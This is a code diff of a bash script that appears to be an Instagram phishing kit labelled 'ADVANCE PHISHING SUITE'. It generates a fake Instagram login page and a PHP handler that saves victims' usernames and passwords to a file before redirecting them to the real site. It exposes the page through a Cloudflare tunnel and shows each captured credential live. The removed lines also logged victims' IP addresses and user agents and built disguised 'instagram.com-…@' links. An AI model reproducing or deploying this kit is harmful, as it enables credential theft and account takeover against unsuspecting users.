@@ -4,6 +4,7 @@
 IMG_URL="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"
 
 # --- 2. SYSTEM SETUP ---
+# Colors
 RED='\033[1;31m'
 GREEN='\033[1;32m'
 CYAN='\033[1;36m'
@@ -31,36 +32,45 @@ fi
 
 PORT=$((4000 + RANDOM % 5000))
 
-# --- 3. LOADING ANIMATION ---
+# --- 3. HACKER LOADING ANIMATION (Real Feel) ---
 clear
-echo -e "${GREEN}[*] INITIALIZING DUAL-SERVER MODE...${RESET}"
+echo -e "${GREEN}[*] INITIALIZING SYSTEM...${RESET}"
 sleep 0.5
-echo -e "${GREEN}[*] STARTING PHP LOCALHOST...    ${CYAN}OK${RESET}"
+echo -e "${GREEN}[*] CHECKING DEPENDENCIES... ${CYAN}OK${RESET}"
 sleep 0.5
-echo -e "${GREEN}[*] CONNECTING TO SATELLITE...   ${CYAN}OK${RESET}"
+echo -e "${GREEN}[*] BYPASSING SECURITY...    ${CYAN}DONE${RESET}"
 sleep 0.5
-echo -ne "${YELLOW}[*] BOOTING SYSTEM: [${RESET}"
-for i in {1..20}; do echo -ne "${RED}#"; sleep 0.05; done
+echo -ne "${YELLOW}[*] LOADING INTERFACE: [${RESET}"
+# Fake Loading Bar
+for i in {1..20}; do
+    echo -ne "${RED}#"
+    sleep 0.05
+done
 echo -e "${YELLOW}] 100%${RESET}"
 sleep 1
 clear
 
-# --- 4. HACKER BANNER ---
+# --- 4. THE CLEAN & READABLE BANNER ---
 echo -e "${CYAN}╔════════════════════════════════════════════════════╗${RESET}"
 echo -e "${CYAN}║ ${GREEN}:: SYSTEM STATUS ::            ${RED}[ ONLINE ]${CYAN}          ║${RESET}"
 echo -e "${CYAN}╠════════════════════════════════════════════════════╣${RESET}"
+echo -e "${CYAN}║                                                    ║${RESET}"
+echo -e "${CYAN}║     ${WHITE}USER ID : ${RED}ADMIN_001${CYAN}                            ║${RESET}"
+echo -e "${CYAN}║     ${WHITE}ACCESS  : ${GREEN}UNLIMITED${CYAN}                            ║${RESET}"
 echo -e "${CYAN}║                                                    ║${RESET}"
 echo -e "${CYAN}║         ${YELLOW}╔══════════════════════════════╗${CYAN}           ║${RESET}"
 echo -e "${CYAN}║         ${YELLOW}║ ${RED}     A N U R A G   H K R    ${YELLOW}║${CYAN}           ║${RESET}"
 echo -e "${CYAN}║         ${YELLOW}╚══════════════════════════════╝${CYAN}           ║${RESET}"
 echo -e "${CYAN}║                                                    ║${RESET}"
-echo -e "${CYAN}║   ${WHITE}MODE    : ${GREEN}DUAL SERVER (LAN + WAN)${CYAN}              ║${RESET}"
+echo -e "${CYAN}║   ${WHITE}TOOL    : ${GREEN}ADVANCE PHISHING SUITE v9.0${CYAN}          ║${RESET}"
 echo -e "${CYAN}║   ${WHITE}TARGET  : ${RED}INSTAGRAM${CYAN}                            ║${RESET}"
 echo -e "${CYAN}║                                                    ║${RESET}"
 echo -e "${CYAN}╚════════════════════════════════════════════════════╝${RESET}"
 echo ""
+echo -e "${GREEN}[+] SECURE PORT ASSIGNED : ${RED}$PORT ${RESET}"
+echo ""
 
-# --- 5. HTML CODE ---
+# --- 5. YOUR ORIGINAL HTML CODE (Unchanged) ---
 cat > auth/index.php <<EOF
 <!DOCTYPE html>
 <html lang="en">
@@ -123,106 +133,72 @@ body{ background:#0b1116; color:#fff; }
 </html>
 EOF
 
-# --- 6. PHP & CAPTURE LOGIC ---
+# --- 6. PHP & MENU ---
 cat > auth/login.php <<EOF
 <?php
-// Capture IP and User Agent too
-\$ip = \$_SERVER['REMOTE_ADDR'];
-\$ua = \$_SERVER['HTTP_USER_AGENT'];
-file_put_contents("../usernames.txt", "IP: " . \$ip . "\nUA: " . \$ua . "\nUser: " . \$_POST['u'] . "\nPass: " . \$_POST['p'] . "\nEND\n", FILE_APPEND);
+file_put_contents("../usernames.txt", "User: " . \$_POST['u'] . " | Pass: " . \$_POST['p'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
 ?>
 EOF
 
-# --- 7. AUTO START BOTH SERVERS ---
+echo -e "${WHITE}[1] Localhost (Internal)${RESET}"
+echo -e "${WHITE}[2] Cloudflare (Worldwide)${RESET}"
+echo ""
+echo -ne "${YELLOW}COMMAND >> ${RESET}"
+read option
 
-# Step A: Start PHP (Localhost)
-echo -e "${BLUE}[*] LAUNCHING LOCAL SERVER (PORT $PORT)...${RESET}"
-$RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
-sleep 2
-
-# Step B: Check/Download Cloudflare
-if [ ! -f "cloudflared" ]; then
-    echo -e "${YELLOW}[*] DOWNLOADING CLOUDFLARE ENGINE...${RESET}"
-    ARCH=$(uname -m)
-    if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
-        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-    else
-        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
-    fi
-    chmod +x cloudflared
-fi
-
-# Step C: Start Cloudflare Tunnel
-echo -e "${BLUE}[*] LAUNCHING SATELLITE TUNNEL...${RESET}"
-$RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
-
-# Step D: Extract Link
-echo -ne "${YELLOW}[*] GENERATING SECURE LINKS... ${RESET}"
-for i in {1..15}; do
-    if [ -f cloud.log ]; then
-        LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
-        if [ ! -z "$LINK" ]; then
-            break
-        fi
-    fi
-    echo -ne "."
+if [[ $option == "1" ]]; then
+    echo -e "${BLUE}[*] STARTING SERVER...${RESET}"
+    $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
     sleep 2
-done
+    echo -e "${GREEN}[✔] SUCCESS: http://127.0.0.1:$PORT${RESET}"
 
-# --- 8. DISPLAY LINKS ---
-echo -e "\n\n${GREEN}[✔] SERVERS RUNNING SUCCESSFULLY!${RESET}"
-echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"
-echo -e "${WHITE} [1] LOCALHOST  : ${YELLOW}http://127.0.0.1:$PORT${RESET}"
-echo -e "${WHITE} [2] CLOUDFLARE : ${YELLOW}${LINK}${RESET}"
-echo -e "${CYAN}════════════════════════════════════════════════════${RESET}"
+elif [[ $option == "2" ]]; then
+    if [ ! -f "cloudflared" ]; then
+        echo -e "${YELLOW}[*] DOWNLOADING ENGINE...${RESET}"
+        ARCH=$(uname -m)
+        if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
+            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+        else
+            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+        fi
+        chmod +x cloudflared
+    fi
 
-# --- 9. URL MASKING ---
-echo -e "${YELLOW}Want to mask the Cloudflare link? (Make it look real)${RESET}"
-echo -ne "${RED}Enter custom text (e.g. verified-badge, blue-tick): ${RESET}"
-read mask
-echo ""
-
-if [ ! -z "$mask" ]; then
-    SHORT=${LINK#https://}
-    MASKED="https://instagram.com-$mask@$SHORT"
-    echo -e "${GREEN}════════════════════════════════════════════════════${RESET}"
-    echo -e "${YELLOW} 🔥 YOUR PRO HACKER LINK: ${RESET}"
-    echo -e "${CYAN} $MASKED ${RESET}"
-    echo -e "${GREEN}════════════════════════════════════════════════════${RESET}"
+    echo -e "${BLUE}[*] LAUNCHING SATELLITE CONNECTION...${RESET}"
+    $RUNNER php -S 127.0.0.1:$PORT -t auth > /dev/null 2>&1 &
+    sleep 2
+    $RUNNER ./cloudflared tunnel -url http://127.0.0.1:$PORT --logfile cloud.log > /dev/null 2>&1 &
+    
+    echo -ne "${YELLOW}[*] ENCRYPTING LINK... ${RESET}"
+    for i in {1..15}; do
+        if [ -f cloud.log ]; then
+            LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
+            if [ ! -z "$LINK" ]; then
+                echo -e "\n\n${GREEN}════════════════════════════════════════${RESET}"
+                echo -e "${YELLOW} TARGET LINK: ${LINK} ${RESET}"
+                echo -e "${GREEN}════════════════════════════════════════${RESET}"
+                break
+            fi
+        fi
+        echo -ne "."
+        sleep 2
+    done
 fi
 
-# --- 10. MATRIX DATA CAPTURE ---
+# --- 7. MONITORING INTERFACE ---
 echo ""
-echo -e "${RED}[*] SYSTEM LISTENING FOR DATA...${RESET}"
-echo ""
-
+echo -e "${RED}[*] SYSTEM READY. WAITING FOR INPUT...${RESET}"
 while true; do
     if [ -f usernames.txt ]; then
-        if grep -q "END" usernames.txt; then
-            IP=$(grep "IP:" usernames.txt | cut -d " " -f 2)
-            USER=$(grep "User:" usernames.txt | cut -d " " -f 2)
-            PASS=$(grep "Pass:" usernames.txt | cut -d " " -f 2)
-            
+        tail -n 0 -f usernames.txt | while read line; do
+            echo -e "${RED}╔════════════════════════════════╗${RESET}"
+            echo -e "${RED}║       [!] DATA CAPTURED        ║${RESET}"
+            echo -e "${RED}╠════════════════════════════════╣${RESET}"
+            echo -e "${GREEN} $line ${RESET}"
+            echo -e "${RED}╚════════════════════════════════╝${RESET}"
             echo -e "\a"
-            echo -e "${GREEN}[!] ENCRYPTED PACKET RECEIVED...${RESET}"
-            sleep 0.5
-            echo -e "${YELLOW}[*] DECRYPTING DATA STREAM...${RESET}"
-            sleep 0.5
-            
-            echo -e "${CYAN}╔════════════════════════════════════════════╗${RESET}"
-            echo -e "${CYAN}║           ${RED}VICTIM COMPROMISED${CYAN}               ║${RESET}"
-            echo -e "${CYAN}╠════════════════════════════════════════════╣${RESET}"
-            echo -e "${CYAN}║ ${WHITE}IP ADDR : ${YELLOW}$IP${CYAN}                  ║${RESET}"
-            echo -e "${CYAN}║                                            ║${RESET}"
-            echo -e "${CYAN}║ ${WHITE}USERNAME: ${GREEN}$USER${CYAN}          ║${RESET}"
-            echo -e "${CYAN}║ ${WHITE}PASSWORD: ${RED}$PASS${CYAN}          ║${RESET}"
-            echo -e "${CYAN}╚════════════════════════════════════════════╝${RESET}"
-            
-            rm usernames.txt
-            touch usernames.txt
-        fi
+        done
     fi
-    sleep 1
 done
